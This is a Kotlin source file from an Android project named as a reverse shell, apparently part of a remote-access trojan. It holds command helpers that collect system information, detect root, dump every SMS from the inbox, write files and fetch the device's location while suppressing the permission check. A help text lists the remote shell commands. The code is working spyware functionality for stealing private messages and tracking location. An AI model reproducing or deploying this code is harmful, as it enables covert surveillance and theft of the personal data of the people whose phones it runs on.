package com.satwik.nexgenius.core.reverse_shell

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.net.Uri
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream
import java.io.OutputStream
import java.net.Socket

fun getSystemInfo(): String {
    val os = System.getProperty("os.name")
    val osVersion = System.getProperty("os.version")
    val osArch = System.getProperty("os.arch")
    val user = System.getProperty("user.name")
    val javaVersion = System.getProperty("java.version")
    val runtimeMemory = Runtime.getRuntime().totalMemory()
    val freeMemory = Runtime.getRuntime().freeMemory()

    return """
        System Information:
        OS: $os
        Version: $osVersion
        Architecture: $osArch
        User: $user
        Java Version: $javaVersion
        Total Memory: $runtimeMemory
        Free Memory: $freeMemory
    """.trimIndent()
}

fun checkRoot(): String {
    val paths = arrayOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/system/sd/xbin/su",
        "/system/bin/failsafe/su",
        "/data/local/su"
    )

    return if(
        paths.any { path -> File(path).exists()})
    {
        "Device is rooted"
    }
    else{
        "Device is not rooted"
    }
}

fun help():String{
    return """
        ----- Additional Shell Commands -----
        help - show help
        sysinfo - get system information
        checkroot - check if device is rooted
        download - download file from url
        location - get device current location
        
    """.trimIndent()
}

fun getSms(context: Context): String {
    val messages = mutableListOf<String>()
    val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
    cursor?.use {
        if (it.moveToFirst()) {
            do {
                var msgData = ""
                for (idx in 0 until it.columnCount) {
                    msgData += " ${it.getColumnName(idx)}:${it.getString(idx)}"
                }
                messages.add(msgData)
            } while (it.moveToNext())
        } else {
            throw Exception("Inbox is empty")
        }
    }
    val formattedMessages = messages.joinToString("\n")
    return formattedMessages
}


//Throws error: /sdcard/Dummy/pogo.txt: open failed: EPERM (Operation not permitted)
fun writeToFile(path:String, fileName: String, data: String): String {
    val file = File(path, fileName)
    file.writeText(data)
    return "Done"
}



@SuppressLint("MissingPermission")
suspend fun getCurrentLocation(context: Context): Location? {
    val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
    val lastLocation = fusedLocationClient.lastLocation.await()
    lastLocation.let {
        return lastLocation
    }
}

